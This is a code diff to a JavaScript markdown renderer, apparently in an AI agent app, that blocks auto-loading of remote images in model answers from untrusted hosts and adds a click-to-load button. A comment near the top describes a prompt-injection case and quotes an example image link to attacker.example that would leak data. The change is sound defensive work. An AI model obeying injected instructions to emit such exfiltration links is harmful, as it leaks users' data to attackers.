@@ -90,7 +90,63 @@ const {
 } = CF_FORMAT;
 const nowIso = () => new Date().toISOString();
 
+// ── Remote images in an answer ─────────────────────────────────────────────
+// An answer is written by a model, and a model can be steered by what it reads:
+// a web page or a file can tell it to write ![](https://attacker.example/?d=…),
+// and an image that loads by itself would send that data away with nobody
+// clicking anything. So an image loads on its own only from CodingFleet (the
+// images the agent generates live on files.codingfleet.com) or from the API
+// the app talks to; any other one waits behind a button that names its host.
+// Removed while sanitizing, before the HTML exists anywhere a browser would
+// fetch it: an <img> fetches as soon as its src is set, even detached.
+function trustedImageHost(host) {
+  const h = String(host || '').toLowerCase();
+  if (h === 'codingfleet.com' || h.endsWith('.codingfleet.com')) return true;
+  try {
+    return Boolean(S.settings && S.settings.apiBase) && h === new URL(S.settings.apiBase).host.toLowerCase();
+  } catch {
+    return false;
+  }
+}
+
+function remoteImageHost(src) {
+  try {
+    const url = new URL(String(src || ''));
+    return /^https?:$/.test(url.protocol) ? url.host : null;
+  } catch {
+    return null; // a relative path: a file in the session folder, handled later
+  }
+}
+
+DOMPurify.addHook('afterSanitizeAttributes', (node) => {
+  // srcset can name any host and is never needed in an answer.
+  if (node.hasAttribute('srcset')) node.removeAttribute('srcset');
+  if (node.nodeName !== 'IMG' && !(node.nodeName === 'INPUT' && node.getAttribute('type') === 'image')) return;
+  const host = remoteImageHost(node.getAttribute('src'));
+  if (host && !trustedImageHost(host)) {
+    node.setAttribute('data-remote-src', node.getAttribute('src'));
+    node.removeAttribute('src');
+  }
+});
+
 const md = (text) => DOMPurify.sanitize(marked.parse(text || '', { gfm: true, breaks: false }));
+
+// An image held back for its host: a button that says where it comes from,
+// and loads it only when pressed.
+function gateRemoteImage(img) {
+  const src = img.getAttribute('data-remote-src');
+  const host = remoteImageHost(src) || 'another site';
+  const gate = el('button', 'remote-image-gate');
+  gate.type = 'button';
+  gate.title = `${src}\nLoading it tells ${host} that you opened this answer, and anything in the address.`;
+  gate.append(icon('image'), el('span', null, `Show image from ${host}`));
+  gate.addEventListener('click', () => {
+    img.removeAttribute('data-remote-src');
+    img.src = src;
+    gate.replaceWith(img);
+  });
+  img.replaceWith(gate);
+}
 
 // Natural sizes of images already loaded, so a streamed answer that is drawn
 // again keeps each image's box instead of collapsing and jumping.
@@ -185,8 +241,10 @@ function setMarkdown(node, text) {
   // again in its reply: each picture is shown once.
   const seen = new Set();
   for (const img of node.querySelectorAll('img')) {
-    if (!seen.has(img.src)) {
-      seen.add(img.src);
+    // A held-back remote image has no src yet: its address is kept aside.
+    const key = img.getAttribute('data-remote-src') || img.src;
+    if (!seen.has(key)) {
+      seen.add(key);
       continue;
     }
     const holder = img.closest('a') || img;
@@ -196,6 +254,7 @@ function setMarkdown(node, text) {
   }
   // A path instead of a URL is a file in the session's folder: nothing serves
   // it, so the picture is read through the main process.
+  for (const img of node.querySelectorAll('img[data-remote-src]')) gateRemoteImage(img);
   for (const img of node.querySelectorAll('img')) adoptLocalImage(img);
   for (const img of node.querySelectorAll('img')) {
     img.decoding = 'async';
